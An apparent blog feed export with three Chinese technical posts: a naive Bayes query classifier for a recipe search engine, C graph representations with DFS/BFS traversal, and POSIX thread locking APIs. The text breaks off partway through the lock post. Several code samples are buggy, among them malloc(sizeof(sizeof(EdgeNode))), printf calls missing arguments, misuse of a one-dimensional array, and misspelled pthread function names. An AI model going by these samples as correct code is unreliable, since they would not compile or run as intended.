    <url>%2F2016%2F03%2F01%2F%E6%9C%B4%E7%B4%A0%E8%B4%9D%E5%8F%B6%E6%96%AF%E5%88%86%E7%B1%BB%E5%99%A8%2F</url>
    <content type="text"><![CDATA[因为工程实践里需要实现语义分析的功能，关于如何语义分析，我也是一头雾水。最近花了点时间，依据贝叶斯原理，针对工程实践，写了一个分类器，效果还阔以~~ 哈哈 写在前头 在研一上学期的时候，学院里分配了一个工程实践项目，我所在的4人组选了基于语义的搜索引擎这个课题，项目主页：https://github.com/willstudy/SearchEngine。目前项目进展到语义分析模块了，我就查阅了相关资料，然后根据项目的数据集，定制了一个贝叶斯分类器。 贝叶斯定理 老是说我第一眼看到这个定理的时候，完全没有任何印象。其实这个定理最早出现在本科所学的概率论中的，好惭愧，竟然被我忘光了。。。 贝叶斯定理主要是：当知道A发生的情况下，B发生的概率 P( B | A) 时， 求 B 发生的条件下，A发生的概率 P( A | B )，其公式为： 这个公式在生活很有用，我们在不知不觉中可能就用到了它。比如说，在街上看到一个黑种人，我们很自然的联想到，他可能来自非洲。在得出判断的过程中，我们就用到了贝叶斯分类器的思想。 贝叶斯分类器 在生活，经常会进行各种各样的分类，比如说文档归类、网页分类等，使用的分类方法称之为分类器。大多数分类器都是基于贝叶斯定理展开的，大致过程如下： 确定需要分出的类别：Y1,Y2,Y3… 对目标分类对象进行特征**(X1,X2,X3…)**提取 计算这些特征的先验概率，即P(X1|Y1),P(X2|Y1),P(X1|Y2)… 根据贝叶斯公式，计算待分类的后验概率，即P(Y1|X1,X2,X3…) 贝叶斯计算后验概率的公式如下： 这里我会根据工程实践中的数据集，进行一步步的分析。 数据集的描述 我的这个工程实践，是基于语义的搜索引擎，主要做关于美食做法方面的搜索。其所有的数据都是从美食天下网爬到的数据，在此给贵网站带来的不便，致以深深的歉意。其中每条记录主要包含如下字段： 菜的标题|网站的URL|菜的介绍|菜图片的URL|菜的食材|菜的类型|菜的做法步骤|菜的小窍门 大约共3.5W条记录。 分类器的原型 老师说过，软件工程的第一步是需求分析。那我第一步从需求分析写起。项目需要的分类器的需求描述如下： 用户输入一句话，比如： 1西红柿炒鸡蛋 分类器能判断用户是想检索菜名类别、食材类别还是工艺类别。因为我选用的分词工具对这句话分割的结果如下： 1西红柿 炒 鸡蛋 如果只是简单的字符串匹配，那么它很可能既属于菜名，又可能属于工艺，又可能属于食材。这时候就需要一个分类器，对分词的结果进行分类处理。 所以这个分类器的输入是：分词后的词组，输出是: 类别。 分类器的设计 根据上文中提到的贝叶斯分类器的设计步骤，我做了如下工作： 1、类别确定 分类器的类别： 菜名、食材、工艺 2、特征提取 我这里提取的特征，是对分词工具一些简单的修改，然后使用它分词之后的结果作为特征。比如 西红柿炒鸡蛋 的特征为 西红柿 炒 鸡蛋，而 排毒养颜的菜 的 特征为 排毒 养颜 菜 3、计算先验概率 这一步花了我很多时间，首先，我用python把之前爬到的3.5W条记录，再次处理了一下。利用python把每个字段对应的信息提取出来。比如说，我共提取了36924条菜名、食材、工艺，分别单独存放在 title.txt、material.txt、type.txt 中。 然后利用分词工具对上述三个文件 title.txt、material.txt、type.txt 再次处理了一下，把它们分割成词条，分别单独存放在了 splite_title.txt、splite_material.txt、splite_type.txt 中。 然后这一步比较简单，我利用Python统计，上述分割后的文件中词条的词频，然后分别除以每个类别的词条总数。用python处理 split_title.txt 文件描述如下： 1234567891011121314151617181920212223242526272829303132#coding=utf-8from __future__ import divisionimport osimport sysimport rereload(sys)sys.setdefaultencoding('utf-8')words = []dictory = &#123;&#125;word_set = []new_dict = &#123;&#125;file_read = open('split_material.txt', 'r')file_write = open('percent_material.txt', 'w+')for line in file_read.readlines(): line = line.strip('\n') words.append(line)word_set = set(words) # exclude these repeated keyWordslength = len(words)print lengthfor item in word_set : dictory[item] = words.count(item) / length new_dict = sorted( dictory.iteritems(), key = lambda d:d[1], reverse = True ) # sort by valuefor key,value in new_dict: file_write.write( key + ":" + str(value) ) file_write.write( '\n' ) 最后会生成 percent_title.txt percent_material.txt percent_type.txt 文件。 最后一步，我这三个概率文件归并在一起，形成最后的先验概率集合。用python描述如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103#coding=utf-8from __future__ import divisionimport osimport sysreload(sys)sys.setdefaultencoding('utf-8')file_title = open('percent_title.txt', 'r')file_material = open('percent_material.txt', 'r')file_type = open('percent_type.txt', 'r')file_gather = open('gather.txt', 'w+')title_num = 123320material_num = 292582type_num = 495875laplace_title = 1 / ( title_num * 2 )laplace_material = 1 / ( material_num * 2 )laplace_type = 1 / ( type_num * 2 )dictory_title = &#123;&#125;dictory_material = &#123;&#125;dictory_type = &#123;&#125;for line in file_title.readlines(): line = line.strip('\n') result = line.split(':') dictory_title[result[0]] = result[1]file_title.close()for line in file_material.readlines(): line = line.strip('\n') result = line.split(':') dictory_material[result[0]] = result[1]file_material.close()for line in file_type.readlines(): line = line.strip('\n') result = line.split(':') dictory_type[result[0]] = result[1]file_type.close()dictory = &#123;&#125;for key in dictory_title: percent = [] if dictory.has_key( key ): pass else : percent.append(dictory_title[key]) percent.append( str(laplace_material) ) percent.append( str(laplace_type) ) dictory[key] = percentfor key in dictory_material: percent = [] if dictory.has_key(key): percent = dictory[key] percent[1] = dictory_material[key] else: percent.append( str(laplace_title) ) percent.append(dictory_material[key]) percent.append( str(laplace_type) ) dictory[key] = percentfor key in dictory_type: percent = [] if dictory.has_key( key ): percent = dictory[key] percent[2] = dictory_type[key] else: percent.append( str(laplace_title) ) percent.append( str(laplace_material) ) percent.append(dictory_type[key]) dictory[key] = percentfor key in dictory: file_gather.write(key + ':') for item in dictory[key]: file_gather.write( item + ' ' ) file_gather.write('\n')file_gather.close() **有一种情况需要特别说明：**当一个词条只出现在一个类别，在其他类别没有出现时，它的先验概率计算： 123laplace_title = 1 / ( title_num * 2 )laplace_material = 1 / ( material_num * 2 )laplace_type = 1 / ( type_num * 2 ) 没错，这就是我采用的Laplace平滑方法。 4、计算后验概率 利用贝叶斯公式，分别求出 菜名、食材、工艺的后验概率。这一步我用PHP语言写的，因为我们的分词工具是SCWS的PHP扩展，半推半就的使用PHP写出了这个分类器。其PHP语言描述如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102&lt;?php/* * 核心模块：基于贝叶斯公式，定制的一个分类器，经测试准度较高 */function gather( $str )&#123; chdir("./lib/nlp/db"); $hand_read = fopen( "gather.txt", 'r' ); if( !$hand_read ) &#123; exit("file gather.txt open failed!"); &#125; $gather_container = array(); /* 初始化数据集 */ while( !feof($hand_read) ) &#123; $buffer = fgets( $hand_read, 1024 ); $buffer = trim( $buffer , "\n" ); list( $name, $title_proba, $material_proba, $type_proba ) = split( '[ :]',$buffer ); $temp = array(); $temp['title'] = $title_proba; $temp['material'] = $material_proba; $temp['type'] = $type_proba; $gather_container[$name] = $temp; &#125; /* 每个类型的总条数 */ $title_num = 123320; $material_num = 292582; $type_num = 495875; $total = $title_num + $material_num + $type_num; /* 这里的比重暂时没想好,越小，说明权重越大 */ /* $title_percent = $total / $title_num ; $material_percent = $total / $material_num ; $type_percent = $total / $type_num ; */ $title_percent = 0.3; $material_percent = 0.3; $type_percent = 0.4; $title = $title_percent; $material = $material_percent; $type = $type_percent; $base = 2.7183; $num = count( $str ); for( $i = 0; $i &lt; $num; $i++ ) &#123; $word = $str[$i]; if( array_key_exists( $word, $gather_container ) ) &#123; $probe_title = $gather_container[$word]['title']; $probe_material = $gather_container[$word]['material']; $probe_type = $gather_container[$word]['type']; &#125; else &#123; $probe_title = 1 / ( $title_num * 2 ) ; $probe_material = 1 / ( $material_num * 2 ) ; $probe_type = 1 / ( $type_num * 2 ) ; &#125; $title *= log( $probe_title , $base ); $material *= log( $probe_material, $base ); $type *= log( $probe_type, $base ); &#125; /* 值越小，说明越趋近某个分类 */ $title = abs( $title ); $material = abs( $material ); $type = abs( $type ); $result = array(); $min_probe = min( $title, $material, $type ); /* 如果概率相差不大，就可以加入此类型中 */ if( $title / $min_probe &lt;= 2 ) &#123; $result['title'] = $title; &#125; if( $material / $min_probe &lt;= 2 ) &#123; $result['material'] = $material; &#125; if( $type / $min_probe &lt;= 2 ) &#123; $result['type'] = $type; &#125; fclose( $hand_read ); return $result;&#125;?&gt; 具体做法把先验概率加载进内存，分别查出每个特征的先验概率 probe_title probe_material probe_type，然后根据每个类别的初始比重，进行连乘，分别求出每个类别的概率，描述如下： 12345678910111213141516if( array_key_exists( $word, $gather_container ) )&#123; $probe_title = $gather_container[$word]['title']; $probe_material = $gather_container[$word]['material']; $probe_type = $gather_container[$word]['type'];&#125;else&#123; $probe_title = 1 / ( $title_num * 2 ) ; $probe_material = 1 / ( $material_num * 2 ) ; $probe_type = 1 / ( $type_num * 2 ) ;&#125;$title *= log( $probe_title , $base );$material *= log( $probe_material, $base );$type *= log( $probe_type, $base ); 这个分类器遇到了一些问题，我会在下部分提出，并写下我的解决方法。 分类器存在的问题及我的解决方案 关于Laplace平滑 若一个特征词只出现在某个分类中，比如说 金玉满堂，它只出现在菜名中，正常的计算结果概率为： 金玉满堂: 6.48718780409e-05 0.00 0.00 这样的计算会使一旦出现这个词，其他种类的概率立马变成0了，因为与0相乘，结果为0。这大大的降低了分类器的准确性。 解决措施：将其他类没有出现该词条的概率设为 1 / ( 2 * 词条总数 )，也称为Laplace平滑。最后 金玉满堂 的先验概率如下： 金玉满堂:6.48718780409e-05 1.70892262682e-06 1.00831862869e-06 关于乘积指数下溢的情况 因为词条种类共仅92W条，所以有的词条概率很低，那么它们进行贝叶斯公式的相乘时，就会造成丢失精度的情况。这种情况下我效仿了一位博主的做法，先对先验概率进行取自然对数，然后进行相乘。 关于特征值之间的独立性 因为贝叶斯公式要求各个特征之间是相互独立的，也就是说 西红柿 炒 鸡蛋 它们之间是没有关系的。然而实际上是有关系，它们之间的关联度，很大程度上觉得了分类结果。这里我的优化措施是，对最后的分类概率再进行平滑，若之间的概率相差不超过2倍，我就多返回一个分类，这样在丢失精度的情况下，同时保证了语义分析。 写在最后 这个分类器难度在于，对实际问题的抽象。如果知道了哪些是我们需要的特征值，怎么计算先验概率，那么剩下的工作就是数据的处理了。这个贝叶斯分类器效果其实还不错，值越小，说明越接近某个分类。大部分情况下，能得出我想要的分类结果。如下图所示： 为了写这个分类器，连续写了3天代码，脸上长了几个痘痘。。。最后感谢那些提供我资料来源的博主们~~ 参考 算法杂货铺——分类算法之朴素贝叶斯分类(Naive Bayesian classification) 朴素贝叶斯分类及其在文本分类、垃圾邮件检测中的应用 Naive Bayes classifier]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[图的基础数据结构与遍历算法]]></title>
    <url>%2F2016%2F02%2F27%2F%E5%9B%BE%E7%9A%84%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E9%81%8D%E5%8E%86%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[快要面临实习了，最近打算专攻一些算法，这篇主要回顾一下图的基本算法，以及基本的的数据结构。 简介 本文主要回顾本科所学的关于图的一些数据结构和基本算法，图在实际问题中应用很广泛，是一种非常重要的数据结构。第一部分叙述图的定义以及基本表示形式，第二部分叙述关于图的一些常用算法。 图的描述 图的定义 图是顶点的非空集合和顶点之间边的非空集合组成的，常用**G(V,E)**表示，其中G表示一个图，V代表图G中顶点的集合，E表示图中边的集合。 图主要分为两类：一种是有向图，一种是无向图。其中有向图是顶点到顶点之间的边是有方向的，而无向图说明顶点间的边是不区分方向的。还有一种特殊的图称为网：顶点间的每条边有一个权重值。 图的基本表示 邻接矩阵 邻接矩阵可以非常简单明了的描述一个图。其主要思想是用一个二维数组描述图中顶点间的关系。它也可以很方便的描述网，其中无向图的邻接矩阵是沿对角线对称的。图的邻接矩阵的C语言描述如下所示： 12345678910111213141516171819202122232425262728293031323334#define MAXVEX 100 // 最大顶点数#define MAXWEIGHT 65535 // 边的最大权重typedef char VertextType; // 顶点表示typedef int EdgeTypde; // 边的表示typedef struct &#123; VertextType vex[MAXVEX]; EdgeTypde edge[MAXVEX][MAXVEX]; int numVertex, numEdge;&#125; MGraph;``` #### **邻接表**邻接矩阵的表示形式很容易造成空间的浪费，因为它把不存在边的信息也需要保存下来。而邻接表的表示方法可以解决这个问题，它使用数组和链表结合的存储方式。其中数组中保存图中的顶点数，链表则保存与该顶点关联的每一条边。其C语言的描述如下：```ctypedef char VertextType; // 顶点表示typedef int EdgeTypde; // 边的表示/* 存储每个与该顶点相连接的顶点链表 */typedef struct EdgeNode &#123; int adjvex; // 存储该顶点在数组中的下标 EdgeTypde weight; // 这条边的权重 struct EdgeNode * next; &#125; EdgeNode;typedef struct VertexNode &#123; VertextType data; EdgeNode * firstEdge; // 与该点相连接的顶点链表中的第一个顶点。&#125; VertexNode, AdjList[MAXVEX];typedef struct &#123; AdjList adjList; // 邻接表 int numVertex, numEdge; // 保存图的顶点数、边数&#125; GraphAdjList; 其中邻接表的初始化代码如下： 123456789101112131415161718192021222324252627void create_graph( GraphAdjList * G ) &#123; ... /* 初始化图的顶点数、变数 */ G-&gt;numVertex = numVertex; G-&gt;numEdge = numEdge; /* 初始化每个顶点的值 */ for( i = 0; i &lt; G-&gt;numVertex; i++ ) &#123; scanf(" %d\n", &amp;G-&gt;adjList[i].data ); &#125; /* 初始化每个顶点的与之相连的顶点链表 */ for( k = 0; k &lt; G-&gt;numEdge; k++ ) &#123; /* 得到每条边的两个顶点在数组中的下标 */ scanf( "%d, %d\n", &amp;vex1, &amp;vex2 ); /* 创建一个EdgeNode,加入这俩个顶点的链表中*/ edge = (EdgeNode *) malloc( sizeof(sizeof(EdgeNode)) ); edge-&gt;adjvex = vex2; // 相连接点在数组中的下标 edge-&gt;next = G-&gt;adjList[vex1].firstEdge; G-&gt;adjList[vex1].firstEdge = edge; edge = (EdgeNode *) malloc( sizeof(sizeof(EdgeNode)) ); edge-&gt;adjvex = vex1; edge-&gt;next = G-&gt;adjList[vex2].firstEdge; G-&gt;adjList[vex2].firstEdge = edge; &#125;&#125; 逆邻接表 在无向图的邻接表中，顶点V的度恰为顶点V对应的第i个链表中的节点数； 而在有向图中，第i个链表中的结点个数只是顶点V的出度，为求入度，必须遍历整个邻接表。有时，为了便于确定顶点的入度或以顶点V为头的弧，可以再建立一个有向图的逆邻接表，**即对每个顶点V建立一个链接以V为头的弧的链表。**其存储结构与邻接表相同。 十字链表 十字链表是有向图的一种存储方法，它实际上是邻接表与逆邻接表的结合。即把每一条边的边结点分别组织到以弧尾顶点为头结点的链表和以弧头顶点为头顶点的链表中。这里有向边称之为弧，弧头为：有向边的起始点；弧尾为：有向边的末尾节点。其C语言描述如下： 12345678910111213typedef struct EdgeNode &#123; int vexTail, vexHead; // 该有向边的弧头、弧尾在顶点表中位置 struct EdgeNode * head, * tail; // 分别连上弧头相同的边和弧尾相同的边 InfoType info; // 该弧的附加信息&#125; EdgeNode;typedef struct VertexNode &#123; VertextType data; EdgeNode * firstIn, * firstOut; // 分别指向该顶点的第一条弧头和弧尾&#125; VertexNode;typedef struct &#123; VertexNode XList[MAXVEX]; int numVertex, numEdge; // 保存图的顶点数、边数&#125; OLGraph; 十字链表的初始化比较麻烦，但实现不难。其过程如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394void create_graph( OLGraph * G ) &#123; ... /* 先初始化顶点数、边数 */ G-&gt;numVertex = numVertex; G-&gt;numEdge = numEdge; /* 在把顶点表的数组初始化 */ for( int i = 0; i &lt; G-&gt;numVertex; i++ ) &#123; scanf( "%d\n", &amp;G-&gt;XList[i].data ); G-&gt;XList[i].firstIn = NULL; G-&gt;XList[i].firstOut = NULL; &#125; /* 然后输入有向边的信息，构造链表 */ for( k = 0; k &lt; G-&gt;numEdge; k++ ) &#123; /* 得到每条边的两个顶点在数组中的下标 */ scanf( "%d, %d\n", &amp;vex1, &amp;vex2 ); /* 创建一个EdgeNode,加入这俩个顶点的链表中*/ edge = (EdgeNode *) malloc( sizeof(sizeof(EdgeNode)) ); edge-&gt;vexTail = vex1; // 该弧的头节点在数组中的下标 edge-&gt;vexHead = vex2; // 弧尾节点在数组中的下标 edge-&gt;head = G-&gt;XList[vex2].firstIn; // 指向弧头相同的节点 edge-&gt;tail = G-&gt;XList[vex1].firstOut; // 指向弧尾相同的节点 G-&gt;XList[vex1].firstOut = G-&gt;XList[vex2].firstin = p; // 构成链表了 &#125;&#125;``` 图的表示形式多种多样，要根据具体问题，选择合适的数据结构，下一部分叙述关于图的基本算法。## **图的算法**### **图的遍历**图的遍历算法应用非常广泛，主要分为两种。一种是深度优先遍历(**DFS**)，一种是广度优先遍历(**BFS**)。主要区别在于遍历的时候，是先从该点的邻接点再次出发遍历(**DFS**)，还是从该点的邻接点集中取的下一个顶点出发遍历(**BFS**)。它们主要特点对每一个已访问的顶点进行标记。 #### **深度优先遍历DFS**根据邻接表或者邻接矩阵的下一个顶点出发遍历，根据一个访问标记数组，来判断是否对该点进行访问。其C语言描述如下：````c/* * 使用邻接矩阵进行DFS遍历操作 */void DFS( MGraph * G, int vex, int visit[] ) &#123; visit[vex] = true; printf("%d : %d \n", vex, G-&gt;vex[vex] ); for( int i = 0; i &lt; G-&gt;numVertex; i++ ) &#123; /* 这两条边没有相连或者已访问过 */ if( G-&gt;edge[vex][i] == 0 || visit[i] == true ) continue; DFS( G, i, visit ); &#125;&#125;/* * 使用邻接表进行DFS操作 */void DFS( GraphAdjList * G, int vex, int visit[] ) &#123; visit[vex] = true; printf("%d : %d \n", vex, G-&gt;AdjList[vex].data ); EdgeNode * edge = G-&gt;AdjList[vex]-&gt;firstEdge; while( edge ) &#123; int index = edge-&gt;adjvex; if( visit[index] != true ) &#123; DFS( G, index, visit ); &#125; edge = edge-&gt;next; &#125;&#125;/* * 使用十字链表进行DFS操作 */void DFS( OLGraph * G, int vex, int visit[] ) &#123; visit[vex] = true; printf("%d : %d \n", vex, G-&gt;XList[vex].data ); Edge * edge = G-&gt;XList[vex].firstOut; while( edge ) &#123; if( visit[edge-&gt;vexHead] != true ) &#123; DFS( G, edge-&gt;vexHead, visit ); &#125; edge = edge-&gt;tail; &#125;&#125;//void DFS_Traverse( MGraph * G )//void DFS_Traverse( GraphAdjList * G )void DFS_Traverse( OLGraph * G ) &#123; int visit[G-&gt;numVertex]; for( int i = 0; i &lt; MAXVEX; i++ ) &#123; visit[i] = false; &#125; for( int i = 0; i &lt; G-&gt;numVertex; i++ ) &#123; if( visit[i] != true ) &#123; DFS( G, i, visit ); &#125; &#125;&#125; 广度优先遍历BFS 可以采用队列数据结构，就像二叉树的层次遍历，其C语言描述如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105/* * 邻接矩阵的BFS遍历 */void BFS_Traverse( MGraph * G ) &#123; int visit[G-&gt;numVertex]; Queue Q; for( int i = 0; i &lt; G-&gt;numVertex; i++ ) &#123; visit[i] = false; &#125; init_queue( &amp;Q ); for( int i = 0; i &lt; G-&gt;numVertex; i++ ) &#123; if( visit[i] == true ) continue; visit[i] = true; printf("%d : %c \n", G-&gt;vex[i] ); in_queue( &amp;Q, i ); while( ! empty( &amp;Q ) ) &#123; int vex; out_queue( &amp;Q, &amp;vex ); for( int j = 0; j &lt; G-&gt;numVertex; j++ ) &#123; if( G-&gt;vex[vex][j] == 0 || visit[j] == true ) continue; visit[j] = true; printf("%d : %c \n", G-&gt;vex[i] ); in_queue( &amp;Q, G-&gt;vex[j] ); &#125; &#125; &#125; &#125; /* * 邻接表的BFS遍历 */void BFS_Traverse( GraphAdjList * G ) &#123; int visit[G-&gt;numVertex]; Queue Q; for( int i = 0; i &lt; G-&gt;numVertex; i++ ) &#123; visit[i] = false; &#125; init_queue( &amp;Q ); for( int i = 0; i &lt; G-&gt;numVertex; i++ ) &#123; if( visit[i] == true ) continue; visit[i] = true; printf("%d : %d \n", G-&gt;adjList[i].data ); in_queue( &amp;Q, i ); while( ! empty( &amp;Q ) ) &#123; int vex; out_queue( &amp;Q, &amp;vex ); Edge * edge = G-&gt;adjList[i].firstEdge; while( edge ) &#123; if( visit[edge-&gt;adjvex] != true ) &#123; visit[edge-&gt;adjvex] = true; printf("%d : %d \n", G-&gt;adjList[i].data ); in_queue( &amp;Q, edge-&gt;adjvex ); &#125; edge = edge-&gt;next; &#125; &#125; &#125; &#125;/* * 十字链表的BFS算法 */void BFS_Traverse( OLGraph * G ) &#123; int visit[G-&gt;numVertex]; Queue Q; for( int i = 0; i &lt; G-&gt;numVertex; i++ ) &#123; visit[i] = false; &#125; init_queue( &amp;Q ); for( int i = 0; i &lt; G-&gt;numVertex; i++ ) &#123; if( visit[i] == true ) continue; visit[i] = true; printf( "%d : %d\n", G-&gt;XList[i].data ); in_queue( &amp;Q, i ); while( ! empty( &amp;Q ) ) &#123; int vex; out_queue( &amp;Q, &amp;vex ); EdgeNode * edge = G-&gt;XList[vex].firstOut; while( edge ) &#123; if( visit[edge-&gt;vexHead] != true ) &#123; visit[edge-&gt;vexHead] = true; printf( "%d : %d\n", G-&gt;XList[i].data ); in_queue( &amp;Q, edge-&gt;vexHead ); &#125; edge = edge-&gt;tail; &#125; &#125; &#125; &#125; 最后 上面是图的基本数据结构以及基本算法，在这个时候，整体梳理一下。下一篇在准备写图的一些常用算法，比如求最小生成树，最短路径等等… 上面参考了网上不少博主的文章，在此表示感谢_ 参考： [1] 大话数据结构-图 [2] C语言中文网 [3] 有向图的十字链表操作 [4] 图的遍历之深度优先搜索和广度优先]]></content>
      <tags>
        <tag>算法</tag>
        <tag>图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[同步互斥锁.md]]></title>
    <url>%2F2016%2F02%2F21%2F%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5%E9%94%81%2F</url>
    <content type="text"><![CDATA[这一篇文章主要讲述UNIX里面的锁机制，分为2类：一种主要用于多线程Thread之间的共享资源访问，另一种主要用于多进程Process之间的访问。参考资料《UNIX环境高级编程》，这是我自己的一些理解，以后还要继续补充。 线程Thread之间的锁 在多线程的环境中，涉及到共享变量的存取，就需要一定程度的同步，否则可能出现意想不到的情况。在UNIX中，用于多线程之间同步的锁分为以下几种： 互斥量（mutex） 读写锁（reader-writer lock） 条件变量 自旋锁 屏障（barrier） 最基本的就是互斥量与自旋锁，其他种类的锁都是对它们的一种封装。下面我依次描述这些类型的锁。 互斥量 互斥量应该很好理解，在访问共享资源前，对互斥量进行加锁，访问完之后进行解锁。对互斥量加锁之后，其他试图再次对该互斥量加锁的线程都会进行阻塞。注意：如果加锁的线程释放了此互斥量，那么所有等待该锁的线程都会被唤醒。 在POSIX中对互斥量进行了如下描述： 12345678910111213141516171819202122232425262728293031323334353637#include &lt;pthread.h&gt;/* * 互斥量使用pthread_mutex_t数据类型表示的， * 在使用它之前，需要对其初始化。 */int pthread_mutex_init( pthread_mutex_t * restrict mutex, const pthread_mutexattr_t * restrict attr );int pthread_mutex_destory( pthread_mutex_t * mutex );/* 成功返回0，否则返回错误编号。 *//* 也可以这样初始化，如：*/pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER ; int pthread_mutex_lock( pthread_mutex_t * mutex );int pthread_mutex_trylock( pthread_mutex_t * mutex ); // 非阻塞版本的lock，若无法加锁，则直接返回int pthread_mutex_unlock( pthread_mutex_t * mutex ); /* 设置一个定时器，如果在指定时间内还没获得该锁，即返回*/int pthread_mutex_timedlock( pthread_mutex_t * restrict mutex, const struct timespec * restrict tsptr );``` 这里有2点需要补充一下：一个是restrict关键字，一个是互斥量的属性pthread\_mutexattr\_t。 **restrict**关键字：restrict是c99标准引入的，它只可以用于限定和约束指针，并表明指针是访问一个数据对象的唯一且初始的方式.即它告诉编译器，所有修改该指针所指向内存中内容的操作都必须通过该指针来修改,而不能通过其它途径(其它变量或指针)来修改;这样做的好处是,能帮助编译器进行更好的优化代码,生成更有效率的汇编代码.如 int \* restrict ptr, ptr 指向的内存单元只能被 ptr 访问到，任何同样指向这个内存单元的其他指针都是未定义的，直白点就是无效指针。以上来自&lt;a href="http://baike.baidu.com/link?url=2TZtDKDId4KMH4NanjA41DQ4xnjT5HqmVWlpdAOGUhxkc20qRMs8Kn4SmGEF-a8r14Y6Gi9-9H2z8DcabVr5v_" target="_blank"&gt;百度百科&lt;/a&gt;**pthread_mutexattr_t**:互斥量的属性，如果需要在多进程直接共享此互斥量，需要把属性设为PTHREAD\_PROCESS\_SHARED，而互斥量的健壮属性与PPTHREAD\_PROCESS\_SHARED有关，以后有机会接触到再深入下去，默认是PTHREAD\_PROCESS\_PRIVATE。 ```c#include &lt;pthread.h&gt;/* 可以通过以下接口修改此属性 */int pthread_mutexattr_getpshared( const pthread_mutexattr_t * restrict attr, int * restrict pshared );int pthread_mutexattr_setpshared( pthread_mutexattr_t * attr, int pshared ); /* 成功返回0，失败返回错误编号 */ 还有一种锁定特性，POSIX定义了4种类型： PTHREAD_MUTEX_NORMAL： 一种标准的互斥量类型，不做错误检查或者死锁监测。 PTHREAD_MUTEX_ERRORCHECK： 提供错误检查 PTHREAD_MUTEX_RECURSIVE： 递归锁，即允许同一线程在该互斥量解锁之前，继续对该互斥量解锁，很重要的属性。 PTHREAD_MUTEX_DEFAULT： 提供默认行为，每个系统对它的实现都不同。 123int pthread_mutexattr_gettype( const pthread_mutexattr_t * restrict attr, int * restrict type );int pthread_mutexattr_settype( pthread_mutexattr_t * attr, int type ); 读写锁 读写锁与互斥量的不同在于，它区分了加锁者的意图。如果对一个共享变量读操作，则加上读锁；如对共享变量写操作，即加上写锁。同一个读写锁在加读锁的情况下，可以继续加读锁，不能加写锁。而同一个读写锁在加写锁情况下，不能再继续加任何锁。POSIX定义的接口如下： 123456789101112131415161718/* 读写锁非常适用于读次数远大于写次数的情况下 */#include &lt;pthread.h&gt;int pthread_rwlock_init( pthread_rwlock_t * restrict rwlock, const pthread_rwlockattr_t * restrict attr );int pthread_rwlock_destory( pthread_rwlock_t * rwlock );int pthread_rwlock_rdlock( pthread_rwlock_t * rwlock );int pthread_rwlock_wrlock( pthread_rwlock_t * rwlock);int pthread_rwlock_unlock( pthread_rwlock_t * rwlock );int pthread_rwlock_tryrdlock( pthread_rwlock_t * rwlock );int pthread_rwlock_trywrlock( pthread_rwlock_t * rwlock ); int pthread_rwlock_timerdlock( pthread_rwlock_t * restrict rwlock, const struct timespec * restrict tsptr );int pthread_rwlock_timerdlock( pthread_rwlock_t * restrict rwlock, const struct timespec * restrict tsptr ); 读写锁属性唯一的属性：进程共享属性。 1234567#include &lt;pthread.h&gt;int pthread_rwlockattr_init( pthread_rwlockattr_t * attr );int pthread_rwlockattr_destory( pthread_rwlockattr_t * attr ); int pthread_rwlockattr_getpshared( const pthread_rwlockattr_t * restrict attr, int * restrict pshared );int pthread_rwlockattr_setpshared( pthread_rwlockattr_t * attr, int pshared ); 条件变量 条件变量与互斥量一起使用时，允许线程以无竞争的方式等待特定的条件发生。条件本身用互斥量锁住，当条件发生的时候，会发信号给等待该条件满足的线程。其主要接口如下： 123456789101112131415#include &lt;pthread.h&gt;int pthread_cond_init( pthread_cond_t * restrict cond, const pthread_condattr_t * restrict attr );int pthread_cond_destory( pthread_cond_t * cond ); int pthread_cond_wait( pthread_cond_t * restrict cond, pthread_mutex_t * restrict mutex );int pthread_cond_timedwait( pthread_cond_t * restrict cond, pthread_mutex_t * restrict mutex, const struct timespec * restrict tsptr );/* 至少唤醒一个等待该条件的线程 */int pthread_cond_signal( pthread_cond_t * cond );/* 唤醒所有等待该条件的线程 */int pthread_cond_broadcast( pthread_cond_t * cond ); 其属性主要包括进程共享属性和时钟属性。 123456789#include &lt;pthread.h&gt;int pthread_condattr_init( pthread_condattr_t * attr );int pthread_condattr_destory( pthread_condattr_t * attr );int pthread_condattr_getpshared( const pthread_condattr_t * restrict attr, int * restrict pshared );int pthread_condattr_setpshared( pthread_condattr_t * attr, int pshared );/* 时钟属性控制着pthread_cond_timedwait采用哪个时钟 */ 条件变量的使用方法一般如下： 1、锁住互斥量，调用pthread_cond_wait或者pthread_cond_timedwait将此条件变量加入到等待队列上。 2、若条件满足的情况下，由该线程调用pthread_cond_signal或者pthread_cond_broadcast唤醒等待此条件变量队列上的一个或多个线程。 自旋锁 自旋锁与互斥量类似，但它不是通过睡眠使得进程阻塞，而是在获得锁之前一直忙等，自旋锁可用于以下情况：锁被持有时间短，而且线程并不希望在重新调度上花费太多成本。 自旋锁在非抢占式内核中是非常有用的，除了提供互斥机制以外，它们还会阻塞中断，这样中断处理程序就不会让系统陷入死锁状态，因为它们需要获取已加锁的自旋锁，因为中断处理程序不能睡眠，因此它们的同步原语只能是自旋锁。其接口如下： 12345678#include &lt;pthread.h&gt;/* 仅支持进程间共享同步这个属性 */int pthread_spin_init( pthread_spinlock_t * lock, int pshared );int pthread_spin_destory( pthread_spinlock_t * lock );int pthread_spin_lock( pthread_spinlock_t * lock );int pthread_spin_trylock( pthread_spinlock_t * lock );int pthread_spin_unlock( pthread_spinlock_t * lock ); 记住在持有自旋锁的情况下，不要调用可能会进入休眠的函数，会浪费CPU的资源。 屏障 屏障是用户协调多个线程并行工作的机制，类型于扩展版本的pthread_join函数。屏障允许多个线程阻塞，直到所有合作的线程都到达某一点，然后从该点继续执行。这种用法类似于内存屏障，它用于解决多核计算机中CPU乱序执行可能造成一些意外的错误，具体可以百度或者搜索一下。对于线程的屏障，POSIX提供了如下接口： 123456789#include &lt;pthread.h&gt;int 